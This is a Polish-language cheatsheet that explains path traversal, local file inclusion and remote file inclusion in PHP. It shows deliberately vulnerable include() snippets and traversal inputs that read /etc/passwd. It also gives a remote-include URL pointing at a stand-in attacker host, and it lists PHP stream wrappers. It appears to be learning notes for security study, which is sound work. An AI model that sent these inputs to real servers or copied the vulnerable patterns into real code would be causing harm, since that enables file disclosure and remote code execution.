# LFI / RFI Cheatsheet

## Path Traversal vs LFI

Path Traversal zwykle oznacza, że aplikacja odczytuje plik i zwraca jego surową zawartość.

LFI, czyli Local File Inclusion, oznacza, że aplikacja dołącza lokalny plik przez mechanizm języka/runtime'u, np. PHP `include()` albo `require()`.

## Przykład Path Traversal

```php
echo file_get_contents('/var/www/images/' . $_GET['filename']);
```

Aplikacja czyta plik i zwraca jego zawartość.

## Przykład LFI

```php
include($_GET["page"]);
```

Aplikacja dołącza plik jako część wykonania programu.

To ważne, bo jeśli dołączony plik zawiera kod PHP, serwer może go wykonać przed zwróceniem outputu.

## Typowe funkcje PHP związane z LFI

- `include()`
- `require()`
- `include_once()`
- `require_once()`

## Scenariusz 1 - brak stałego katalogu

```php
include($_GET["lang"]);
```

Oczekiwane użycie:

```txt
?lang=EN.php
?lang=AR.php
```

Problem:

```txt
?lang=/etc/passwd
```

Użytkownik kontroluje cały target include.

## Scenariusz 2 - stały prefix katalogu

```php
include("languages/" . $_GET["lang"]);
```

Oczekiwane użycie:

```txt
?lang=EN.php
```

Ryzykowny input:

```txt
?lang=../../../../etc/passwd
```

Finalna ścieżka może wyjść poza katalog `languages/`.

## Error messages w black-box testingu

Niepoprawny input typu:

```txt
?lang=THM
```

może ujawnić błędy takie jak:

```txt
include(languages/THM.php)
```

To może ujawnić:

- dodawany prefix,
- doklejany suffix,
- pełną ścieżkę serwera,
- funkcję używaną przez backend.

## RFI - Remote File Inclusion

RFI występuje wtedy, gdy podatna funkcja include/require ładuje plik ze zdalnego URL-a kontrolowanego przez atakującego.

Przykład:

```txt
?page=http://attacker.example/payload.txt
```

Serwer ofiary pobiera zdalny plik i może wykonać go jako included code.

## PHP settings związane z RFI

- `allow_url_fopen`
- `allow_url_include`

Jeśli remote includes nie są potrzebne, powinny być wyłączone.

## PHP wrappers

PHP wrappers to mechanizmy streamów, które mogą czytać albo transformować różne źródła danych.

Przykłady:

- `php://filter`
- `php://input`
- `data://`
- `file://`
- `expect://`

## Kluczowe różnice

| Typ | Główna idea | Typowy impact |
|---|---|---|
| Path Traversal | Manipulacja ścieżką do odczytu pliku | File disclosure |
| LFI | Dołączenie lokalnego pliku z serwera | File disclosure, czasem RCE |
| RFI | Dołączenie zdalnego pliku kontrolowanego przez atakującego | Często RCE |

## Najważniejszy takeaway

LFI używa plików, które już istnieją na serwerze ofiary. RFI pozwala atakującemu kontrolować zawartość dołączanego pliku zdalnie.
